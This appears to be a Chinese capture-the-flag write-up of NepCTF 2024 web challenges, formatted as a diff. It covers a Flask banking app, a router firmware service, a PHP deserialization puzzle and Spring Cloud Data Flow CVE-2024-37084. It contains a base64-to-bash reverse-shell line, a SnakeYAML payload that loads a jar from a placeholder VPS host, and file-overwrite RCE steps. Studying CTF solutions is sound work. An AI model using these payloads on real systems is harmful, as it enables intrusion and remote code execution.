+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">in</span> session:
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, logged_in=<span class="hljs-literal">True</span>, username=session[<span class="hljs-string">&quot;username&quot;</span>], balance=users[session[<span class="hljs-string">&quot;username&quot;</span>]][<span class="hljs-string">&quot;balance&quot;</span>])
+    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, logged_in=<span class="hljs-literal">False</span>)
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/reset&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>():
+    <span class="hljs-keyword">global</span> users
+    users = &#123;&#125;  <span class="hljs-comment"># Clear all existing users</span>
+    users = generate_random_users(<span class="hljs-number">1000</span>)
+    users[<span class="hljs-string">&quot;HRP&quot;</span>] = &#123;<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;HRP&quot;</span>, <span class="hljs-string">&quot;balance&quot;</span>: <span class="hljs-number">6000</span>&#125;
+    <span class="hljs-keyword">global</span> admin_password
+    admin_password=&#123;&#125;
+    <span class="hljs-keyword">global</span> flag
+    <span class="hljs-comment"># Add an admin user with a random password</span>
+    admin_password = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="hljs-number">15</span>))
+    flag=admin_password
+
+    users[<span class="hljs-string">&quot;admin&quot;</span>] = &#123;<span class="hljs-string">&quot;password&quot;</span>: admin_password, <span class="hljs-string">&quot;balance&quot;</span>: <span class="hljs-number">0</span>&#125;
+    
+    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))
+
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():
+    username = request.form.get(<span class="hljs-string">&quot;username&quot;</span>)
+    password = request.form.get(<span class="hljs-string">&quot;password&quot;</span>)
+    <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> users[username][<span class="hljs-string">&quot;password&quot;</span>] == password:
+        session[<span class="hljs-string">&quot;username&quot;</span>] = username
+        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid credentials&quot;</span>, <span class="hljs-number">403</span>
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():
+    session.pop(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-literal">None</span>)
+    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">log_transfer</span>(<span class="hljs-params">sender, receiver, amount</span>):
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_data_with_rsa</span>(<span class="hljs-params">data, pubkey</span>):
+        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):  <span class="hljs-comment"># Encrypt the data multiple times</span>
+            encrypted_data = rsa.encrypt(data.encode(), pubkey)
+        <span class="hljs-keyword">return</span> encrypted_data.<span class="hljs-built_in">hex</span>()
+
+    timestamp = datetime.datetime.now().strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S.%f&#x27;</span>)
+    
+    <span class="hljs-comment"># Encrypt the amount and timestamp</span>
+    encrypted_amount = encrypt_data_with_rsa(<span class="hljs-built_in">str</span>(amount), pubkey)
+    encrypted_timestamp = encrypt_data_with_rsa(timestamp, pubkey)
+    
+    log_data = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;encrypted_timestamp&#125;</span> - Transfer from <span class="hljs-subst">&#123;sender&#125;</span> to <span class="hljs-subst">&#123;receiver&#125;</span> of encrypted amount <span class="hljs-subst">&#123;encrypted_amount&#125;</span>\n&quot;</span>
+    
+    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>): 
+        log_data += <span class="hljs-string">f&quot;Transaction initiated from device: <span class="hljs-subst">&#123;random.choice([<span class="hljs-string">&#x27;Mobile&#x27;</span>, <span class="hljs-string">&#x27;Web&#x27;</span>, <span class="hljs-string">&#x27;ATM&#x27;</span>, <span class="hljs-string">&#x27;In-Branch Terminal&#x27;</span>])&#125;</span>\n&quot;</span>
+        log_data += <span class="hljs-string">f&quot;Initiator IP address: <span class="hljs-subst">&#123;random.choice([<span class="hljs-string">&#x27;192.168.1.&#x27;</span>, <span class="hljs-string">&#x27;10.0.0.&#x27;</span>, <span class="hljs-string">&#x27;172.16.0.&#x27;</span>])&#125;</span><span class="hljs-subst">&#123;random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">254</span>)&#125;</span>\n&quot;</span>
+        log_data += <span class="hljs-string">f&quot;Initiator geolocation: Latitude <span class="hljs-subst">&#123;random.uniform(-<span class="hljs-number">90</span>, <span class="hljs-number">90</span>):<span class="hljs-number">.6</span>f&#125;</span>, Longitude <span class="hljs-subst">&#123;random.uniform(-<span class="hljs-number">180</span>, <span class="hljs-number">180</span>):<span class="hljs-number">.6</span>f&#125;</span>\n&quot;</span>
+        log_data += <span class="hljs-string">f&quot;Receiver&#x27;s last login device: <span class="hljs-subst">&#123;random.choice([<span class="hljs-string">&#x27;Mobile&#x27;</span>, <span class="hljs-string">&#x27;Web&#x27;</span>, <span class="hljs-string">&#x27;ATM&#x27;</span>])&#125;</span>\n&quot;</span>
+        log_data += <span class="hljs-string">f&quot;Associated fees: $<span class="hljs-subst">&#123;random.uniform(<span class="hljs-number">0.1</span>, <span class="hljs-number">3.0</span>):<span class="hljs-number">.2</span>f&#125;</span>\n&quot;</span>
+        log_data += <span class="hljs-string">f&quot;Remarks: <span class="hljs-subst">&#123;random.choice([<span class="hljs-string">&#x27;Regular transfer&#x27;</span>, <span class="hljs-string">&#x27;Payment for invoice #&#x27;</span>+<span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>)), <span class="hljs-string">&#x27;Refund for transaction #&#x27;</span>+<span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>))])&#125;</span>\n&quot;</span>
+        log_data += <span class="hljs-string">&quot;-&quot;</span>*<span class="hljs-number">50</span> + <span class="hljs-string">&quot;\n&quot;</span>
+
+    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;transfer_log.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> f:
+        f.write(log_data)
+
+
+
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/transfer&#x27;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>():
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Not logged in&quot;</span>, <span class="hljs-number">403</span>
+    
+    receivers = request.form.getlist(<span class="hljs-string">&quot;receiver&quot;</span>)
+    amount = <span class="hljs-built_in">int</span>(request.form.get(<span class="hljs-string">&quot;amount&quot;</span>))
+    <span class="hljs-keyword">if</span> amount &lt;<span class="hljs-number">0</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Insufficient funds&quot;</span>, <span class="hljs-number">400</span>
+    logging_enabled = request.form.get(<span class="hljs-string">&quot;logs&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>).lower() == <span class="hljs-string">&quot;true&quot;</span>
+    
+    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&quot;username&quot;</span>] <span class="hljs-keyword">in</span> receivers:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot transfer to self&quot;</span>, <span class="hljs-number">400</span>
+    
+    <span class="hljs-keyword">for</span> receiver <span class="hljs-keyword">in</span> receivers:
+        <span class="hljs-keyword">if</span> receiver <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> users:
+            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Invalid user <span class="hljs-subst">&#123;receiver&#125;</span>&quot;</span>, <span class="hljs-number">400</span>
+    
+    total_amount = amount * <span class="hljs-built_in">len</span>(receivers)
+    <span class="hljs-keyword">if</span> users[session[<span class="hljs-string">&quot;username&quot;</span>]][<span class="hljs-string">&quot;balance&quot;</span>] &gt;= total_amount:
+        <span class="hljs-keyword">for</span> receiver <span class="hljs-keyword">in</span> receivers:
+            <span class="hljs-keyword">if</span> logging_enabled:
+                log_transfer(session[<span class="hljs-string">&quot;username&quot;</span>], receiver, amount)
+            mutex.acquire()
+            users[session[<span class="hljs-string">&quot;username&quot;</span>]][<span class="hljs-string">&quot;balance&quot;</span>] -= amount
+            users[receiver][<span class="hljs-string">&quot;balance&quot;</span>] += amount
+            mutex.release()
+        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Insufficient funds&quot;</span>, <span class="hljs-number">400</span>
+
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/buy_flag&#x27;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">buy_flag</span>():
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Not logged in&quot;</span>, <span class="hljs-number">403</span>
+
+    <span class="hljs-keyword">if</span> users[session[<span class="hljs-string">&quot;username&quot;</span>]][<span class="hljs-string">&quot;balance&quot;</span>] &gt;= flag_price:
+        users[session[<span class="hljs-string">&quot;username&quot;</span>]][<span class="hljs-string">&quot;balance&quot;</span>] -= flag_price
+        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Here is your flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Insufficient funds&quot;</span>, <span class="hljs-number">400</span>
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_users&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>():
+    num = <span class="hljs-built_in">int</span>(request.args.get(<span class="hljs-string">&#x27;num&#x27;</span>, <span class="hljs-number">1000</span>))
+    selected_users = random.sample(<span class="hljs-built_in">list</span>(users.keys()), num)
+    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;users&quot;</span>: selected_users&#125;
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/view_balance/&lt;username&gt;&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">view_balance</span>(<span class="hljs-params">username</span>):
+    <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users:
+        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;username&quot;</span>: username, <span class="hljs-string">&quot;balance&quot;</span>: users[username][<span class="hljs-string">&quot;balance&quot;</span>]&#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User not found&quot;</span>, <span class="hljs-number">404</span>
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/force_buy_flag&#x27;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">force_buy_flag</span>():
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&quot;username&quot;</span>] != <span class="hljs-string">&quot;HRP&quot;</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Permission denied&quot;</span>, <span class="hljs-number">403</span>
+
+    target_user = request.form.get(<span class="hljs-string">&quot;target_user&quot;</span>)
+    <span class="hljs-keyword">if</span> target_user <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> users:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User not found&quot;</span>, <span class="hljs-number">404</span>
+
+    <span class="hljs-keyword">if</span> users[target_user][<span class="hljs-string">&quot;balance&quot;</span>] &gt;= flag_price:
+        users[target_user][<span class="hljs-string">&quot;balance&quot;</span>] -= flag_price
+        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;User <span class="hljs-subst">&#123;target_user&#125;</span> successfully bought the flag!,&quot;</span>+<span class="hljs-string">f&quot;Here is your flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;User <span class="hljs-subst">&#123;target_user&#125;</span> does not have sufficient funds&quot;</span>, <span class="hljs-number">400</span>
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="hljs-literal">False</span>)
+</code></pre></div>
+
+<p>思路大概就是换分数达到10000买admin的密码，然后通过<code>/admin</code>路由进行rce</p>
+<p>刚开始看到secret_key的时候不太相信，直到发现能够解密session</p>
+<p>于是可以进行session伪造，并且可以通过<code>/get_users</code>路由获取所有用户名称</p>
+<p><img src="/../images/NepCTF2024-web/image-20240828224756071.png" srcset="/img/loading.gif" lazyload alt="image-20240828224756071"></p>
+<p>伪造后转到同一个账户中，然后买密码</p>
+<p><img src="/../images/NepCTF2024-web/image-20240828215815742.png" srcset="/img/loading.gif" lazyload alt="image-20240828215815742"></p>
+<p><code>/admin</code>登陆后上传文件lock.txt （我还以为lock.txt是什么重要文件呢。。。）</p>
+<p>目录穿越即可</p>
+<p>反弹shell发现无权限读取flag</p>
+<p>查看进程</p>
+<p><img src="/../images/NepCTF2024-web/image-20240829045419324.png" srcset="/img/loading.gif" lazyload alt="image-20240829045419324"></p>
+<p>不知道为什么burp自带浏览器一直加载不出来<code>/admin</code>的界面，所以后面就不尝试了</p>
+<h2 id="NepRouter-–-狸猫换太子"><a href="#NepRouter-–-狸猫换太子" class="headerlink" title="NepRouter – 狸猫换太子"></a>NepRouter – 狸猫换太子</h2><p>一路点下来，注册了TEST用户，登录，就能下载router</p>
+<p>这个router是路由器固件，它相当于app.py这种，运行它就会启动相应的服务</p>
+<p>ida分析</p>
+<p><img src="/../images/NepCTF2024-web/image-20240829042226059.png" srcset="/img/loading.gif" lazyload alt="image-20240829042226059"></p>
+<p>在8080端口开启服务</p>
+<p><img src="/../images/NepCTF2024-web/image-20240829042356600.png" srcset="/img/loading.gif" lazyload alt="image-20240829042356600"></p>
+<p>查询数据库中注册的用户，登录判断是不是<code>NepNepIStheBestTeam</code></p>
+<p>而在注册时会被加密</p>
+<p><img src="/../images/NepCTF2024-web/image-20240829043105487.png" srcset="/img/loading.gif" lazyload alt="image-20240829043105487"></p>
+<p>我在做题时就是卡在不知道咋注册别的用户</p>
+<p>这里的做法其实很简单，前端修改TEST为其他用户即可</p>
+<p><img src="/../images/NepCTF2024-web/image-20240829043320200.png" srcset="/img/loading.gif" lazyload alt="image-20240829043320200"></p>
+<p>因为加密逻辑就在前端，但是由于会一直debuger，所以我当时也没细看</p>
+<p>修改为<code>NepNepIStheBestTeam</code>即可</p>
+<p>然后就到<code>router</code>启动在8080端口的服务登录即可</p>
+<p>接着就到了setrouter路由，存在命令执行</p>
+<p><img src="/../images/NepCTF2024-web/image-20240829043703283.png" srcset="/img/loading.gif" lazyload alt="image-20240829043703283"></p>
+<p><img src="/../images/NepCTF2024-web/image-20240829043728734.png" srcset="/img/loading.gif" lazyload alt="image-20240829043728734"></p>
+<p><img src="/../images/NepCTF2024-web/image-20240829003037137.png" srcset="/img/loading.gif" lazyload alt="image-20240829003037137"></p>
+<p><strong>这里注意抓包发现会被url编码，但是这里路由器固件不会进行处理，所以要手动解码</strong></p>
+<p><img src="/../images/NepCTF2024-web/image-20240829003558484.png" srcset="/img/loading.gif" lazyload alt="image-20240829003558484"></p>
+<p><img src="/../images/NepCTF2024-web/image-20240829002939335.png" srcset="/img/loading.gif" lazyload alt="image-20240829002939335"></p>
+<p><img src="/../images/NepCTF2024-web/image-20240829003704330.png" srcset="/img/loading.gif" lazyload alt="image-20240829003704330"></p>
+<h2 id="NepRouter-–-白给"><a href="#NepRouter-–-白给" class="headerlink" title="NepRouter – 白给"></a>NepRouter – 白给</h2><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#反弹shell</span>
+&#123;<span class="hljs-built_in">echo</span>,&#125;|&#123;<span class="hljs-built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</code></pre></div>
+
+
+
+<p><img src="/../images/NepCTF2024-web/image-20240829012725881.png" srcset="/img/loading.gif" lazyload alt="image-20240829012725881"></p>
+<p><img src="/../images/NepCTF2024-web/image-20240829012817375.png" srcset="/img/loading.gif" lazyload alt="image-20240829012817375"></p>
+<p>使用<code>python3 -m http.server 3333</code>开启http服务，把blood-pool-HRP下载下来</p>
+<p><img src="/../images/NepCTF2024-web/image-20240829182023791.png" srcset="/img/loading.gif" lazyload alt="image-20240829182023791"></p>
+<p>mysql无法直接用会报错</p>
+<p>于是使用python去查询数据库</p>
+<p><img src="/../images/NepCTF2024-web/image-20240829161214722.png" srcset="/img/loading.gif" lazyload alt="image-20240829161214722"></p>
+<p>使用<code>pip list</code>可以查看已安装的库，其中就存在<code>mysql-connector-python</code></p>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> mysql.connector;connection = mysql.connector.connect(host=<span class="hljs-string">&quot;localhost&quot;</span>,user=<span class="hljs-string">&quot;root&quot;</span>,password=<span class="hljs-string">&quot;Nep+-*/HRP123456789&quot;</span>,database=<span class="hljs-string">&quot;TradeSecrets&quot;</span>);cursor = connection.cursor();query = <span class="hljs-string">&quot;SELECT * from flag&quot;</span>;cursor.execute(query);results = cursor.fetchall();<span class="hljs-built_in">print</span>(results);cursor.close();connection.close()</code></pre></div>
+
+
+
+<p><img src="/../images/NepCTF2024-web/image-20240829012603545.png" srcset="/img/loading.gif" lazyload alt="image-20240829012603545"></p>
+<h2 id="PHP-MASTER"><a href="#PHP-MASTER" class="headerlink" title="PHP_MASTER"></a>PHP_MASTER</h2><p><a target="_blank" rel="noopener" href="https://writeup.owo.show/lan-qiao-bei-2023#ezphp">https://writeup.owo.show/lan-qiao-bei-2023#ezphp</a></p>
+<p>原题，两处小变动</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">highlight_file</span>( <span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);
+    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key=== <span class="hljs-string">&quot;\0key\0&quot;</span>)&#123;
+            <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];
+            <span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>);
+            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$contents</span>);
+
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>]))&#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);
+        &#125;
+        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep1&#x27;</span>].<span class="hljs-string">&quot;[welcome to&quot;</span>. <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>].<span class="hljs-string">&quot;CTF]&quot;</span>);
+        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$str</span>===<span class="hljs-string">&#x27;NepCTF]&#x27;</span>)&#123;
+            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;b) ();
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>
+<span class="hljs-class"></span>&#123;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-variable language_">$this</span>-&gt;s = <span class="hljs-variable">$s</span>;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span> -&gt;str;
+    &#125;
+&#125;
+<span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]));
+<span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-string">&quot;00&quot;</span>,<span class="hljs-variable">$ser</span>);
+<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);</code></pre></div>
+
+
+
+<p>然后</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);
+    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);
+&#125;</code></pre></div>
+
+<p>思路是使<code>$end-1-$start</code>为负数，使得提取的内容能被nep1控制</p>
+<p>经过测试<code>]1231231231231[NepCTF]</code>即可</p>
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>phpinfo查看环境变量</p>
+<p><img src="/../images/NepCTF2024-web/image-20240829021327795.png" srcset="/img/loading.gif" lazyload alt="image-20240829021327795"></p>
+<h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>就像原题中的用大写<code>S</code>解析<code>\00</code>从而避免后面被替换</p>
+<div class="code-wrapper"><pre><code class="hljs autoit">$a = $_POST[1]<span class="hljs-comment">;</span>
+$contents = file_get_contents($a)<span class="hljs-comment">;</span>
+file_put_contents($a, $contents)<span class="hljs-comment">;</span></code></pre></div>
+
+<p>接着通过这些代码尝试进行rce</p>
+<p>其实我思考了一会就想要尝试filterchain去覆盖index.php</p>
+<p>但是我一打发现服务崩掉了</p>
+<p>赛后发现就是预期解</p>
+<p>复现时尝试了几个马都不行，甚至phpinfo会导致服务宕机</p>
+<p>经过多次测试发现php_filter_chain_generator生成的payload第一次的编码不是普通的base64，所以可能导致后面构造字符出现问题</p>
+<p>解决方法就是先进行一次base64加密，然后再使用生成的payload</p>
+<p><img src="/../images/NepCTF2024-web/image-20240829034947801.png" srcset="/img/loading.gif" lazyload alt="image-20240829034947801"></p>
+<h2 id="Always-RCE-First"><a href="#Always-RCE-First" class="headerlink" title="Always RCE First"></a>Always RCE First</h2><p>看附件</p>
+<p><img src="/../images/NepCTF2024-web/image-20240829181005026.png" srcset="/img/loading.gif" lazyload alt="image-20240829181005026"></p>
+<p>很容易找到对应的CVE-2024-37084</p>
+<p>但是不好搜索到对应的poc</p>
+<p>实际上已经有了<a target="_blank" rel="noopener" href="https://forum.butian.net/article/513">https://forum.butian.net/article/513</a></p>
+<p>根据文章复现即可</p>
+<div class="code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-number">1.0</span><span class="hljs-number">.0</span>
+<span class="hljs-attr">origin:</span> <span class="hljs-string">my</span> <span class="hljs-string">origin</span>
+<span class="hljs-attr">repositoryId:</span> <span class="hljs-number">12345</span>
+<span class="hljs-attr">repositoryName:</span> <span class="hljs-string">local</span>
+<span class="hljs-attr">kind:</span> <span class="hljs-type">!!javax.script.ScriptEngineManager</span> [<span class="hljs-type">!!java.net.URLClassLoader</span> [[<span class="hljs-type">!!java.net.URL</span> [<span class="hljs-string">&quot;http://vps_ip:port/yaml-payload.jar&quot;</span>]]]]
+<span class="hljs-attr">name:</span> <span class="hljs-string">test1</span>
+<span class="hljs-attr">version:</span> <span class="hljs-number">1.1</span><span class="hljs-number">.1</span></code></pre></div>
+
+<p>脚本转换得到 <code>packageFileAsBytes</code></p>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test-1.1.1.zip&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:
+    zip_data = file.read()
+
+<span class="hljs-built_in">print</span>([byte <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> zip_data])</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs awk">javac src<span class="hljs-regexp">/artsploit/</span>AwesomeScriptEngineFactory.java
+jar -cvf yaml-payload.jar -C src/ .</code></pre></div>
+
+<p>注意要使用1.8.0_202版本的<code>javac</code>和<code>jar</code></p>
+<p><img src="/../images/NepCTF2024-web/image-20240829181248389.png" srcset="/img/loading.gif" lazyload alt="image-20240829181248389"></p>
+<p><img src="/../images/NepCTF2024-web/image-20240829181721960.png" srcset="/img/loading.gif" lazyload alt="image-20240829181721960"></p>
+<p><img src="/../images/NepCTF2024-web/image-20240829180721758.png" srcset="/img/loading.gif" lazyload alt="image-20240829180721758"></p>
+<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>同样是<code>/api/package/upload</code>的上传功能</p>
+<p>能够进行目录穿越进行文件覆盖，从而进行RCE</p>
+<p>可以通过覆盖charsets.jar进行RCE</p>
